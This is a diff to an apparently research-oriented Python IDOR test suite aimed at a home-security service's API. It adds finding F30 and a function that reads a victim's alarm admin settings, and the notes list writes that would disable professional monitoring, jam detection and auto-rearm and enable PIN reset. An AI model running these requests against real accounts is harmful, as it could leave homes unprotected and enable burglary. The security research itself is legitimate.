@@ -219,6 +219,22 @@ FINDINGS = [
                   'If uid not validated against JWT sub: full Firebase identity takeover for victim. '
                   'Test: GET /v1/users/{victim_uid}/firebaseCredentials with own token; '
                   '200+token -> attempt signInWithCustomToken -> Firestore read = CRITICAL.'),
+    Finding("F30", "CRITICAL", "Admin Settings IDOR — Persistent Monitoring Disable",
+            "yoda", "/ss3/subscriptions/{sid}/settings/admin", "GET+POST", None,
+            verified=False,
+            notes='APK: SS3AdminSettings.java + SettingsRequestBody.java (classes14.dex). '
+                  'Settings section "admin" exposes: monitoring, autoRearm, jamDetectionEnable, '
+                  'jamThreshold, swingerShutdown, pinResettable, obiwanA, obiwanB, UL985, sensorCheckin. '
+                  'If sid not validated against JWT: '
+                  '(1) Read: exfiltrate admin config including whether professional monitoring is enabled. '
+                  '(2) Write {monitoring:false}: permanently disable professional alarm response. '
+                  '(3) Write {jamDetectionEnable:false}: silently jam RF without triggering alerts. '
+                  '(4) Write {autoRearm:false}: prevent system from rearming after alarm triggered. '
+                  '(5) Write {pinResettable:true}: enable PIN reset vector. '
+                  'Unlike F8 (one-time state change), admin settings persist indefinitely. '
+                  'obiwanA/obiwanB = internal codenames for unknown config — RE pending. '
+                  'Test: GET /v1/ss3/subscriptions/{victim_sid}/settings/admin with own token; '
+                  '200 = CRITICAL; then test POST with {admin:{monitoring:false}}.'),
 ]
 
 
@@ -542,6 +558,29 @@ def test_firebase_token_idor(token, victim_uid):
             _print("CRIT", 200, f"200 OK (parse err: {e}) raw={r.text[:200]}")
     else:
         _print("INFO", r.status_code, f"firebaseCredentials/{victim_uid}: {r.text[:100]}")
+
+
+def test_admin_settings_idor(token, victim_sid):
+    """F30: Read/write victim's admin settings — persistent monitoring disable."""
+    print(f"\n=== F30 — Admin Settings IDOR (victim_sid={victim_sid}) ===")
+    base = SERVICES["yoda"]
+    r = get(f"{base}/ss3/subscriptions/{victim_sid}/settings/admin", token=token)
+    if not r:
+        print("  Request failed"); return
+    if r.status_code == 200:
+        try:
+            d = r.json()
+            admin = d.get("admin", d)
+            monitoring = admin.get("monitoring")
+            jam = admin.get("jamDetectionEnable")
+            rearm = admin.get("autoRearm")
+            _print("CRIT", 200,
+                   f"ADMIN SETTINGS READ sid={victim_sid} monitoring={monitoring} "
+                   f"jamDetect={jam} autoRearm={rearm} raw={str(admin)[:100]}")
+        except Exception as e:
+            _print("CRIT", 200, f"200 OK (parse err: {e}) raw={r.text[:200]}")
+    else:
+        _print("INFO", r.status_code, f"settings/admin/{victim_sid}: {r.text[:100]}")
 
 
 # ─── IDOR Test Suite ────────────────────────────────────────────────────────────
